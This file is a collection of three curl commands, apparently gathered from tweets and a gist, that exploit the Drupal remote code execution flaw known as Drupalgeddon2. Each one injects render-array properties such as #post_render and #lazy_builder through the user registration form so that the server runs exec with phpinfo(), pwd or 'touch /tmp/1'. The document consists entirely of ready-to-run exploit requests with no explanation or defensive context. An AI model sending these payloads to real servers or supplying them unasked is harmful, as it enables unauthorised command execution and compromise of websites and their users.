curl -X POST --data \
  'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=phpinfo()' \
  'https://localhost/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'

# Source: https://twitter.com/i_bo0om/status/984674893768921089

#
#- - - 
#

curl -s -X 'POST' \
  --data 'mail[%23post_render][]=exec&mail[%23children]=pwd&form_id=user_register_form' \
  'http://drupal.url/user/register?element_parents=account/mail/%23value&ajax_form=1'

# Source: https://twitter.com/IamSecurity/status/984977193565646848

#
#- - -
#

curl -i 'http://localhost/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
    --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/1'

# Source: https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
